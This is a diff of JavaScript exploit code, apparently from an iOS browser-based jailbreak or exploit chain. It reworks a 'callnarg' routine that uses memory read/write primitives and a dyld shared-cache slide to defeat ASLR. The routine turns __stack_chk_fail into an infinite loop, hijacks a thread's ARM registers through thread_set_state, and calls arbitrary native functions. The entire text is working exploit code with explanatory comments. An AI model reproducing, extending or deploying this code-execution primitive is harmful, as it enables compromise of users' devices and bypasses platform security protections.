@@ -6,6 +6,23 @@ var slide = 0x0;
 var base = 0x0;
 //var slid = 0x0;
 
+var mytask = 0;
+var count = 0x130000;
+var th = 0x130100;
+var thread_state = 0x130200;
+var countptr = 0x131000;
+var thptr = 0x131004;
+var thread_stateptr = 0x131008;
+var thread = 0x130300;
+var threadptr = 0x132300;
+var threadptrptr = 0x133300;
+
+var countptrptr = 0x132000;
+var thptrptr = 0x132004;
+var thread_stateptrptr = 0x132008;
+
+var stack_shit = 0x161000;
+
 function get_dyld_shc_slide() {
 	/*
 	 *  ROP chain places dyld shc slide at slide + reserve_addr + 20
@@ -103,24 +120,9 @@ function callnarg() {
 		return printf("error: tried to run callnarg without args. arguments.length=%d\n", arguments.length);
 	}
 
-	mytask = 0;
-	count = 0x130000;
-	th = 0x130100;
-//	thread_state_ptr = 0x130008;
-	thread_state = 0x130200;
-	countptr = 0x131000;
-	thptr = 0x131004;
-	thread_stateptr = 0x131008;
-	thread = 0x130300;
-	threadptr = 0x132300;
-	threadptrptr = 0x133300;
-
-	countptrptr = 0x132000;
-	thptrptr = 0x132004;
-	thread_stateptrptr = 0x132008;
-
-	var stack_shit = 0x161000;
-
+	/*
+	 *  setup ptrs
+	 */
 	write_u32(countptr, count);
 	write_u32(thptr, th);
 	write_u32(threadptr, thread);
@@ -132,15 +134,27 @@ function callnarg() {
 	write_u32(thread_stateptrptr, thread_stateptr);	
 
 	var addy = arguments[0];
-
 	var dyld_shc_slide = get_dyld_shc_slide();
 
+	/*
+	 *  make __stack_chk_fail infinite loop
+	 *  (works by setting its lazy addy to its resolver, thus the resolver just
+	 *   endlessly jumps to iself)
+	 */
 	write_u32(0x346afc48 + dyld_shc_slide, 0x23d751fc + dyld_shc_slide);
 
-	calls4arg("pthread_create", threadptr, 0, 0x23d751fc + dyld_shc_slide, 0);
-	var thread = read_u32(threadptr);
-	write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
+	/*
+	 *  if the thread doesn't exist, create it.
+	 */
+	if (read_u32(th) === 0) {
+		calls4arg("pthread_create", threadptr, 0, 0x23d751fc + dyld_shc_slide, 0);
+		thread = read_u32(threadptr);
+		write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
+	}
 
+	/*
+	 *  write first 4 to r0-r3, rest to stack
+	 */
 	for (var i = 1; i < arguments.length; i++) {
 		if (i <= 4) {
 			write_u32(thread_state + ((i - 1) << 2), arguments[i]);
@@ -149,20 +163,62 @@ function callnarg() {
 		}
 	}
 
+	/*
+	 *  stack
+	 */
 	write_u32(thread_state + (13 << 2), stack_shit);
-	write_u32(thread_state + (14 << 2), 0x23d751fc + dyld_shc_slide);
-	write_u32(thread_state + (15 << 2), addy);
-	write_u32(thread_state + (16 << 2), 0x40000020);
 
+	/*
+	 *  return address, infinite loop
+	 */
+	write_u32(thread_state + (14 << 2), 0x23d751fc + dyld_shc_slide);
+
+	/*
+	 *  pc
+	 */
+	write_u32(thread_state + (15 << 2), addy);
+
+	/*
+	 *  cpsr, magic
+	 */
+	if (addy & 1) {
+		write_u32(thread_state + (16 << 2), 0x40000020);
+	} else {
+		write_u32(thread_state + (16 << 2), 0x40000000);
+	}
+
+	/*
+	 *  set the state
+	 */
 	calls4arg("thread_set_state", read_u32(th), ARM_THREAD_STATE, thread_state, ARM_THREAD_STATE_COUNT);
+
+	/*
+	 *  probably un-necessary now, keeping in just in case for now
+	 */
 	calls4arg("thread_resume", read_u32(th), 0, 0, 0);
 
+	/*
+	 *  spin wait for return
+	 */
 	while (true) {
+		/*
+		 *  reset, it's used as input for thread_state size
+		 */
 		write_u32(count, 0x1000);
 		calls4arg("thread_get_state", read_u32(th), ARM_THREAD_STATE, thread_state, count);
+
+		/*
+		 *  if the pc is in (resolver, resolver + 8), suspend the thread
+		 *  (to not spin endlessly), read r0 and return
+		 */
 		if ((read_u32(thread_state + (15 << 2)) - (0x23d751fc + dyld_shc_slide)) <= 8) {
+			calls4arg("thread_suspend", read_u32(th), 0, 0, 0);
 			return read_u32(thread_state);
 		}
 		calls4arg("usleep", 1000, 0, 0, 0);
 	}
+}
+
+function callsnarg() {
+
 }
